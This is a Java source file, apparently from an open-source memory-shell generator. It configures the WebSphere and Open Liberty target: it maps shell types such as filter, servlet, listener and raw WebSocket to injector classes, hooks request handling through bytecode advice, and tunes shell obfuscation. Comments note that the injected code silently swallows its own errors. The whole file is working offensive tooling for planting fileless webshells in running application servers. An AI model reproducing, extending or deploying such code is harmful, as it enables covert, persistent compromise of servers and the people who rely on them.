package com.reajason.javaweb.memshell.server.websphere;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import java.util.Collections;
import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class WebSphere extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connContext"), "_response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Map<String, Object> getShellObfuscationOptionOverrides(String shellType) {
        if (WAS_AGENT_FILTER_MANAGER.equals(shellType)) {
            // AgentFilterManager 的 shell 被 defineClass 进 WebAppFilterManager 的 defining
            // loader；Open Liberty 上这是 Equinox 的 com.ibm.ws.webcontainer bundle loader，
            // 该 bundle 未 import javax.crypto，AES 解密例程会在 <clinit> 抛
            // NoClassDefFoundError，随后被注入代码的 catch (Throwable) 静默吞掉。
            return Collections.singletonMap("enableAES", false);
        }
        return super.getShellObfuscationOptionOverrides(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.websphere.WebSphereServletInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.websphere.WebSphereWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.websphere.WebSphereWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.websphere.WebSphereRawWsInjector")
                .addInjector(WAS_AGENT_FILTER_MANAGER, "com.reajason.javaweb.memshell.injector.websphere.WebSphereFilterChainAgentInjector")
                .build();
    }

    /**
     * RawWebSocket 需要按 shell 类名派生 helper 并随注入器下发；helper 在目标容器里
     * 由注入器先 defineClass，shell 构造时按名字自行解析。传统 WAS 只有 Servlet 3.0，
     * helper 直接走连接器的 TCP 读写上下文接管 socket。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(WebSphereRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
